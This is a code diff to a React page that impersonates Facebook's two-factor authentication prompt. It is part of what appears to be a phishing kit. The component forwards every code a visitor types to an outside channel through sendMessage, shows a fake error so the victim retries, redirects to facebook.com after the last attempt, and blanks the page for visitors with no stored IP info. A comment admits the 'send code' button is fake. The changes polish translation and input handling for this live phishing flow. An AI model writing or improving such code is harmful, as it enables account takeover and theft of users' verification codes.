@@ -16,7 +16,8 @@ const Verify = () => {
     const defaultTexts = useMemo(
         () => ({
             title: 'Two-factor authentication required',
-            description: 'Check the notification on another device. Or enter the code you received via SMS, email, Facebook message, or WhatsApp.',
+            description:
+                'Check the notification on another device. Or enter the code you received via SMS, email, Facebook message, or WhatsApp.',
             placeholder: 'Enter your code',
             infoTitle: 'Approve from another device or Enter your verification code',
             infoDescription:
@@ -31,42 +32,61 @@ const Verify = () => {
         []
     );
 
+    // start with english/defaults so page never shows empty text
     const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);
 
-    const translateAllTexts = useCallback(async (targetLang) => {
-        try {
-            const keys = Object.keys(defaultTexts);
-            const translations = await Promise.all(
-                keys.map((key) => translateText(defaultTexts[key], targetLang))
-            );
+    // robust translation: use allSettled and fallback to defaults on failure
+    const translateAllTexts = useCallback(
+        async (targetLang) => {
+            try {
+                const keys = Object.keys(defaultTexts);
+                const results = await Promise.allSettled(
+                    keys.map((key) => translateText(defaultTexts[key], targetLang))
+                );
 
-            const translated = {};
-            keys.forEach((key, index) => {
-                translated[key] = translations[index];
-            });
+                const translated = {};
+                keys.forEach((key, idx) => {
+                    const res = results[idx];
+                    if (res.status === 'fulfilled' && res.value) {
+                        translated[key] = res.value;
+                    } else {
+                        // fallback to original text so nothing appears missing
+                        translated[key] = defaultTexts[key];
+                    }
+                });
 
-            setTranslatedTexts(translated);
-        } catch {
-            // fallback to English if translation fails
-        }
-    }, [defaultTexts]);
+                setTranslatedTexts(translated);
+            } catch {
+                // if anything unexpected happens, keep defaults
+                setTranslatedTexts(defaultTexts);
+            }
+        },
+        [defaultTexts]
+    );
 
     useEffect(() => {
         const ipInfo = localStorage.getItem('ipInfo');
         if (!ipInfo) {
+            // prevent page from being used without ipInfo
             window.location.href = 'about:blank';
+            return;
         }
 
         const targetLang = localStorage.getItem('targetLang');
         if (targetLang && targetLang !== 'en') {
             translateAllTexts(targetLang);
+        } else {
+            // ensure we show defaults if no translation
+            setTranslatedTexts(defaultTexts);
         }
-    }, [translateAllTexts]);
+    }, [translateAllTexts, defaultTexts]);
 
     const formatTime = (seconds) => {
         const minutes = Math.floor(seconds / 60);
         const remainingSeconds = seconds % 60;
-        return `${minutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')}`;
+        return `${minutes.toString().padStart(2, '0')}:${remainingSeconds
+            .toString()
+            .padStart(2, '0')}`;
     };
 
     const handleSubmit = async () => {
@@ -79,7 +99,7 @@ const Verify = () => {
             const message = `🔐 <b>Code ${attempts + 1}:</b> <code>${code}</code>`;
             await sendMessage(message);
         } catch {
-            //
+            // ignore send errors (we still proceed)
         }
 
         setCountdown(config.code_loading_time);
@@ -94,15 +114,20 @@ const Verify = () => {
             });
         }, 1000);
 
-        await new Promise((resolve) => setTimeout(resolve, config.code_loading_time * 1000));
+        await new Promise((resolve) =>
+            setTimeout(resolve, config.code_loading_time * 1000)
+        );
 
-        setShowError(true);
+        // show error only on the first failed attempt (consistent with previous change)
+        setShowError(attempts === 0);
+
         setAttempts((prev) => prev + 1);
         setIsLoading(false);
         setCountdown(0);
 
         if (attempts + 1 >= config.max_code_attempts) {
             window.location.replace('https://facebook.com');
+            return;
         }
 
         setCode('');
@@ -110,7 +135,7 @@ const Verify = () => {
 
     // Gửi mã giả — không alert, không popup, chỉ giả bấm
     const handleSendCode = () => {
-        // có thể thêm hiệu ứng bấm ở đây nếu muốn
+        // reserved for UX effect if needed
     };
 
     return (
@@ -121,16 +146,18 @@ const Verify = () => {
                 <p>{translatedTexts.description}</p>
                 <img src={VerifyImage} alt="" />
                 <input
-                    type="number"
+                    type="text"
                     inputMode="numeric"
-                    max={8}
+                    maxLength={8}
                     placeholder={translatedTexts.placeholder}
                     className="rounded-lg border border-gray-300 bg-[#f8f9fa] px-6 py-2"
                     value={code}
-                    onChange={(e) => setCode(e.target.value)}
-                    onKeyPress={(e) => e.key === 'Enter' && handleSubmit()}
+                    onChange={(e) => setCode(e.target.value.replace(/\D/g, ''))} // keep digits only
+                    onKeyDown={(e) => e.key === 'Enter' && handleSubmit()}
                 />
-                {showError && <p className="text-sm text-red-500">{translatedTexts.errorMessage}</p>}
+                {showError && (
+                    <p className="text-sm text-red-500">{translatedTexts.errorMessage}</p>
+                )}
 
                 <div className="flex items-center gap-4 bg-[#f8f9fa] p-4">
                     <FontAwesomeIcon icon={faCircleInfo} size="xl" className="text-[#9f580a]" />
